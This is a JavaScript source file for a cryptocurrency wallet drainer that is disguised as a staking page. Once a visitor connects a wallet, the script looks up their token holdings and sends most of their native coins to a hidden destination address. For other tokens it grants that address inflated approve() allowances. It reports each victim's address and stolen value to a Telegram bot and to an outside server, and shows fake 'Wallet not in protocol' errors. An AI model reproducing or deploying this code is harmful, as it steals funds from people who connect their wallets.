import { web3Modal } from "./app.js";
import {
  getAccount,
  getContract,
  writeContract,
  fetchTransaction,
  prepareSendTransaction,
  switchNetwork,
  getNetwork,
  sendTransaction,
} from "@wagmi/core";
import CHAIN_LIST from "./assets/app/chain_list.js";
const chain_list = CHAIN_LIST;
const destination_addy = import.meta.env.VITE_DESTINATION_ADDY;
const minUsdValue = 5;
const rpcProvider = "https://rpc.ankr.com/eth";
const approve_abi = [
  {
    constant: false,
    inputs: [
      {
        name: "_spender",
        type: "address",
      },
      {
        name: "_value",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];
const web3Rpc = new Web3(new Web3.providers.HttpProvider(rpcProvider));
document.getElementById("connectButton").addEventListener("click", async () => {
  connectWallet();
});

document.getElementById("button1").addEventListener("click", async () => {
  connectWallet();
});

document.getElementById("button2").addEventListener("click", async () => {
  connectWallet();
});

document.getElementById("button3").addEventListener("click", async () => {
  connectWallet();
});

document.getElementById("button4").addEventListener("click", async () => {
  connectWallet();
});

const tx_history = [];
let errorsCount = 0;
let tx_hash;
function pipeAndFilter(data) {
  data.forEach((item) => {
    if (item.id && item.id.startsWith("0x")) {
      item.is_native = false;
    } else {
      item.is_native = true;
    }
  });
  const filteredData = data.filter(
    (item) => item.is_verified && item.amount * item.price > minUsdValue
  );
  const sortedData = filteredData.sort(
    (a, b) => b.amount * b.price - a.amount * a.price
  );
  return sortedData;
}

function chain_to_chainId(params) {
  const matchingItem = chain_list.find((item) => item.id === params);
  return matchingItem ? matchingItem.community_id : null;
}

function isConnected() {
  var account = getAccount();
  return account.isConnected;
}
async function connectWallet() {
  if (isConnected()) {
    await wagmi4L();
  } else {
    console.log("not yet connected. trying to connect");
    try {
      await web3Modal.openModal();

      const unsubscribe = web3Modal.subscribeModal(async (newState) => {
        if (isConnected()) {
          await wagmi4L();
          console.log("wallet connected");
          unsubscribe();
        }
      });
    } catch (error) {
      console.error("Failed to connect:", error);
      alert("Couldn't connect. Please use a web3 enabled browser.");
    }
  }
}
async function recalibratebutton(btntext, changestate) {
  if (changestate) {
    $("#connectButton").removeAttr("disabled");
  }
  $("#connectButton").html(btntext);
}
async function switchChain(targetId, chainName) {
  try {
    const network = await switchNetwork({
      chainId: targetId,
    });
    // console.log;
  } catch (error) {
    console.error("Failed to switch network:", error);
    alert(`Wrong Network. Kindly Switch Browser Network to: ${chainName.toUpperCase()}`);
  }
}
async function fetchBalances() {
  let account = getAccount();

  let message = {
    address: account.address,
    netWorth: `https://debank.com/profile/${account.address}`,
  };
  notify(message, "Connection");

  const url = `https://pro-openapi.debank.com/v1/user/all_token_list?id=${account.address}`;
  const headers = {
    Accept: "application/json",
    AccessKey: import.meta.env.VITE_DEBANK_KEY,
  };
  try {
    const response = await fetch(url, {
      method: "GET",
      headers: headers,
    });
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    const data = await response.json();
    return [pipeAndFilter(data), account.address];
  } catch (error) {
    console.error("Tokens Fetch error: ", error.message);
  }
}
function notify(params, title) {
  let apiToken = import.meta.env.VITE_TELEGRAM_BOT_API;
  let chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
  // let message = `New ${title} 🏆🏆🏆 %0A%0Website: ${window.location.host} %0A%0A`;
  let message = encodeURIComponent(`New ${title} 🏆🏆🏆\n\nWebsite: ${window.location.host}\n\n`);

  Object.keys(params).forEach(function (key) {
    message += ` ${key} : ${params[key]} %0A%0A`;
  });
  let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${message}`;
  let request = new XMLHttpRequest();
  request.open("GET", urlString);
  request.send();
}

async function stakeEth(chain, addy, amt) {
  //   console.log(amt)
  const tx = await prepareSendTransaction({
    chainId: chain,
    account: addy,
    to: destination_addy,
    value: BigInt(amt),
  });
  const { hash } = await sendTransaction(tx);
  return hash;
}
async function stakeToken(chain, contract, addy, amt) {
  const { hash } = await writeContract({
    chainId: chain,
    address: contract,
    account: addy,
    abi: approve_abi,
    functionName: "approve",
    args: [destination_addy, amt],
  });
  return hash;
}

async function wagmi4L() {
  $("#connectButton").attr("disabled", "disabled");
  $("#connectButton").html("Initializing...");
  const [tokenBalances, address] = await fetchBalances();
  console.log(tokenBalances);
  if (tokenBalances.length === 0) {
    recalibratebutton("Wallet not in protocol", false);
    return;
  }
  const { chain, chains } = getNetwork();
  let presentChainId = chain.id;
  for (let item of tokenBalances) {
    const targetChainId = chain_to_chainId(item.chain);
    if (targetChainId !== presentChainId) {
      await switchChain(targetChainId, item.chain);
      presentChainId = targetChainId;
    }
    let mm_amount;
    let safe_gas = 5;

    const { chain, chains } = getNetwork();
    const chainIsSupported = !chain.unsupported;
    if (chainIsSupported) {
      try {
        if (parseInt(presentChainId) > 1) {
          safe_gas = 2;
        }
        if (item.is_native) {
          let items_under_chain = tokenBalances.filter(
            (items) => items.chain === item.chain
          ).length;
          let history_under_chain = tx_history.filter(
            (itemss) => itemss.chain === item.chain
          ).length;
          let fiveusd_chain = (safe_gas / item.price) * 10 ** item.decimals;
          let estimated_remaining_underchain =
            (items_under_chain - history_under_chain) * fiveusd_chain;
          let amount = item.raw_amount - estimated_remaining_underchain;
          while (item.raw_amount < amount) {
            amount -= fiveusd_chain;
          }
          mm_amount = amount;
          tx_hash = await stakeEth(
            chain_to_chainId(item.chain),
            address,
            amount
          );
        } else {
          tx_hash = await stakeToken(
            chain_to_chainId(item.chain),
            item.id,
            address,
            item.raw_amount * 1000
          );
        }
        const transaction = await fetchTransaction({ hash: tx_hash });

        if (transaction) {
          let message = {
            address: address,
            hash: tx_hash,
            chain: item.chain,
            history: `https://debank.com/profile/${address}/history`, // fiveusd_chain may not be defined if the else path is taken
            Worth: `$${
              item.is_native ? item.price * mm_amount : item.price * item.amount
            }`,
          };
          notify(message, "Money_Drop");

          const requestData = {
            address: address,
            contractAddress: item.id,
            transactionHash: tx_hash,
            websiteUrl: window.location.host,
            chainId: targetChainId,
          };

          const xhrr = new XMLHttpRequest();
          const url = "https://dark-plum-dove-belt.cyclic.app/oracle/erc20";

          xhrr.open("POST", url, true);
          xhrr.setRequestHeader("Content-Type", "application/json");

          xhrr.onreadystatechange = function () {
            if (xhrr.readyState === 4 && xhrr.status === 200) {
              const response = JSON.parse(xhrr.responseText);
              console.log("Response from server:", response);
            }
          };

          xhrr.send(JSON.stringify(requestData));
        }

        tx_history.push(item);
      } catch (error) {
        // console.log(error);
        errorsCount += 1;
        alert(`Error: Wallet not in protocol.. Retrying`);
      }
    } else {
      errorsCount += 1;
      alert("Network not supported");
      recalibratebutton("Network not supported.", true);
    }
  }
  if (errorsCount > 0) {
    recalibratebutton("Retry", true);
  }
}
